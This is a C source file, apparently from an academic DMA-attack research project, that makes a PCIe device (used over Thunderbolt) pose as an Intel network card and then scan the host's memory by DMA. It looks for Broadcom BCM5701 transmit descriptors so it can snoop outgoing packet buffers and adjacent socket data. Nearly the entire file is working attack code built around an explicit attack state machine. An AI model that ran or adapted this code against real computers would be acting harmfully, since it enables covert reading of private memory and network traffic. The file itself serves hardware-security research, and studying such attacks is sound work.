/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdint.h>
#include <stdio.h>

#include "mask.h"
#include "pcie.h"
#include "pcie-backend.h"
#include "qemu/bswap.h"

/*
 * We want to snoop data out of anything interesting. A good candidate is the
 * transmit mbufs -- in particular we hope that we'll be able to some adjacent
 * local socket mbufs.
 *
 * We scan through pages, checking to see if the first 16 * 16 = 256 bytes all
 * match Brett's heuristic for a send buffer descriptor.
 */

/* Each send buffer descriptor is 128 bits = 16 bytes */
struct bcm5701_send_buffer_descriptor {
	uint64_t host_address;
	uint16_t flags;
	uint16_t length;
	uint16_t vlan_tag;
	uint16_t reserved;
};

enum bcm5701_send_flags {
	BSF_TCP_UDP_CKSUM = (1 << 0),
	BSF_IP_CKSUM = (1 << 1),
	BSF_PACKET_END = (1 << 2),
	// 3, 4, 5 are reserved
	BSF_VLAN_TAG = (1 << 6),
	BSF_COAL_NOW = (1 << 7),
	BSF_CPU_PRE_DMA = (1 << 8),
	BSF_CPU_POST_DMA = (1 << 9),
	// 10, 11, 12, 13, 14, are reserved
	BSD_DONT_GEN_CRC = (1 << 15)
};

void
print_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		printf("host_address: 0x%016lx; flags: 0x%04x; length: 0x%04x;\n\t"
			"vlan_tag: 0x%04x; reserved: 0x%04x.\n",
			descriptor[i].host_address, descriptor[i].flags,
			descriptor[i].length, descriptor[i].vlan_tag,
			descriptor[i].reserved);
	}
}

bool
any_descriptor_nonzero(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		if (descriptor[i].host_address || descriptor[i].flags ||
			descriptor[i].length || descriptor[i].vlan_tag ||
			descriptor[i].reserved) {
			return true;
		}
	}
	return false;
}

bool
is_probably_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
{
	return ((buffer->flags &
		(uint32_mask_enable_bits(5, 3) | uint32_mask_enable_bits(14, 10)))
		== 0) && buffer->length != 0 && (buffer->reserved == 0) &&
		(buffer->host_address != 0);
}

bool
is_brett_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
{
	return ((buffer->host_address & 0xffffffff) == 0) &&
		((buffer->host_address & 0xff00000000000000) == 0x0800000000000000) &&
		(buffer->vlan_tag == 0);
}

void
endianess_swap_descriptor(struct bcm5701_send_buffer_descriptor *descriptor)
{
	descriptor->host_address = bswap64(descriptor->host_address);
	descriptor->flags = bswap16(descriptor->flags);
	descriptor->length = bswap16(descriptor->length);
	descriptor->vlan_tag = bswap16(descriptor->vlan_tag);
	descriptor->reserved = bswap16(descriptor->reserved);
}

void
endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
	uint64_t count)
{
	for (uint64_t i = 0; i < count; ++i) {
		endianess_swap_descriptor(&(descriptor[i]));
	}
}

static inline uint64_t
get_page_address(uint64_t address)
{
	return (address & ~uint64_mask(12));
}

int
read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
{
	const int CHUNK_SIZE = 256;
	int i, read_result = 0;
	uint64_t page_address = get_page_address(address);
	for (i = 0; i < 4096; i += CHUNK_SIZE) {
		read_result = perform_dma_read((buffer + i), CHUNK_SIZE, devfn, 0,
			(page_address + i));
		if (read_result != 0) {
			break;
		}
	}
	return read_result;
}

void
print_page(uint8_t* page_data)
{
	const uint64_t BYTES_PER_LINE = 16;
	uint64_t offset = 0;
	while (offset < 4096) {
		if (offset % BYTES_PER_LINE == 0) {
			printf("%04lx  ", offset);
		}
		printf("%02x", page_data[offset]);
		++offset;
		if (offset % BYTES_PER_LINE == 0) {
			putchar('\n');
		} else {
			putchar(' ');
		}
	}
}

int
print_page_at_address(uint64_t address, uint32_t devfn)
{
	int read_result;
	uint8_t page_data[4096];

	read_result = read_page(address, devfn, page_data);

	if (read_result == -1) {
		printf("UR trying read page.\n");
		return read_result;
	}

	printf("0x%lx\n", get_page_address(address));
	print_page(page_data);

	return read_result;
}

enum attack_state {
	AS_UNINITIALISED,
	AS_PROBING_NIC,
	/* This doesn't work from Thunderbolt. The brdge itself seems to drop the
	 * config requests. XXX: Would be interesting to try on FreeBSD
	 * internally.
	 */
	AS_LOOKING_FOR_DESCRIPTOR_RING
};

enum packet_response {
	PR_NO_RESPONSE, PR_RESPONSE
};

struct packet_response_state {
	uint32_t devfn;
	enum attack_state attack_state;
};

enum packet_response
respond_to_packet(struct packet_response_state *state,
	struct RawTLP *in, struct RawTLP *out)
{
	uint16_t requester_id;
	uint64_t req_addr;
	enum packet_response response = PR_NO_RESPONSE;
	struct TLP64DWord0 *dword0 = (struct TLP64DWord0 *)in->header;
	struct TLP64RequestDWord1 *request_dword1 =
		(struct TLP64RequestDWord1 *)(in->header + 1);
	struct TLP64ConfigRequestDWord2 *config_request_dword2 =
		(struct TLP64ConfigRequestDWord2 *)(in->header + 2);

	enum tlp_direction dir = get_tlp_direction(in);

	requester_id = request_dword1->requester_id;

	switch (dword0->type) {
	case CFG_0:
		if ((config_request_dword2->device_id & uint32_mask(3)) != 0) {
			printf("Don't like device_id: %x.\n",
				config_request_dword2->device_id);
			break;
		}

		state->devfn = config_request_dword2->device_id;
		response = PR_RESPONSE;
		req_addr = get_config_req_addr(in);

		if (dir == TLPD_READ) {
			out->data_length = 4;
			switch (req_addr) {
			case 0: /* vendor and device id */
				out->data[0] = 0x104b8086;
				if (state->attack_state == AS_UNINITIALISED) {
					state->attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
				}
				break;
			default:
				out->data[0] = 0;
			}
			out->data[0] = bswap32(out->data[0]);
		} else {
			out->data_length = 0;
		}

		out->header_length = 12;
		create_completion_header(out, dir, state->devfn,
			TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id, request_dword1->tag,
			0);

		break;
	case CPL:
		printf("Got CPL ");
		if (in->data_length > 0) {
			printf("with data[0] 0x%x.\n", in->data[0]);
		} else {
			printf("without data.\n");
		}
		break;
	default:
		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
			dword0->type);
		break;
	}
	return response;
}

int
main(int argc, char *argv[])
{
	int send_result;
	TLPQuadWord tlp_in_quadword[32];
	TLPQuadWord tlp_out_header[2];
	TLPQuadWord tlp_out_data[16];
	struct RawTLP raw_tlp_in;
	struct RawTLP raw_tlp_out;
	raw_tlp_out.header = (TLPDoubleWord *)tlp_out_header;
	raw_tlp_out.data = (TLPDoubleWord *)tlp_out_data;

	enum packet_response response;
	struct packet_response_state packet_response_state;
	packet_response_state.attack_state = AS_UNINITIALISED;
	int read_result;
	/*uint64_t next_read_addr = 0x400000;*/
	uint64_t read_addr, next_read_addr = 0x00000;
	struct bcm5701_send_buffer_descriptor descriptors[16];
	/*
	 * We have found that in practise the tx ring is not located lower
	 * than this.
	 */

	int init = pcie_hardware_init(argc, argv, &physmem);
	if (init) {
		puts("Problem initialising PCIE core.");
		return init;
	}

	uint64_t addr, req_addr;

	drain_pcie_core();
	puts("PCIe Core Drained. Let's go.");


	while (1) {
		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);

		if (is_raw_tlp_valid(&raw_tlp_in)) {
			response = respond_to_packet(&packet_response_state,
				&raw_tlp_in, &raw_tlp_out);
			if (response != PR_NO_RESPONSE) {
				send_result = send_tlp(&raw_tlp_out);
				assert(send_result != -1);
			}
			continue;
		}

		switch (packet_response_state.attack_state) {
		case AS_UNINITIALISED:
			break;
		case AS_PROBING_NIC:
			/* This doesn't work from Thunderbolt: we get UR responses coming
			 * from the bridges' ID.
			 */
			create_config_request_header(&raw_tlp_out, TLPD_READ,
				packet_response_state.devfn, 0, 0xF, bdf_to_uint(4, 0, 0), 0);
			send_result = send_tlp(&raw_tlp_out);
			printf("NIC probe result: %d.\n", send_result);
			break;
		case AS_LOOKING_FOR_DESCRIPTOR_RING:
			read_result = perform_dma_read((uint8_t *)descriptors,
				256, packet_response_state.devfn, 0, next_read_addr);
			read_addr = next_read_addr;
			next_read_addr += 4096;
			if (read_result == -1 || !any_descriptor_nonzero(descriptors, 16)) {
				continue;
			}
			endianess_swap_descriptors(descriptors, 16);
			/*if (!is_probably_descriptor(&(descriptors[0]))) {*/
			if (!is_brett_descriptor(&(descriptors[0]))) {
				continue;
			}
			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
			print_descriptors(descriptors, 16);
			/*print_page_at_address(descriptors[0].host_address,*/
				/*packet_response_state.devfn);*/
			printf("host_address >> 32 = 0x%lx.\n",
				descriptors[0].host_address >> 32);
			/*print_page_at_address(descriptors[0].host_address >> 32,*/
				/*packet_response_state.devfn);*/
			printf("host_address with mask = 0x%lx.\n",
				descriptors[0].host_address & uint64_mask(32));
			/*print_page_at_address(descriptors[0].host_address & uint64_mask(32),*/
				/*packet_response_state.devfn);*/
			break;
		}
	}
	
	puts("Quitting main loop.");
}
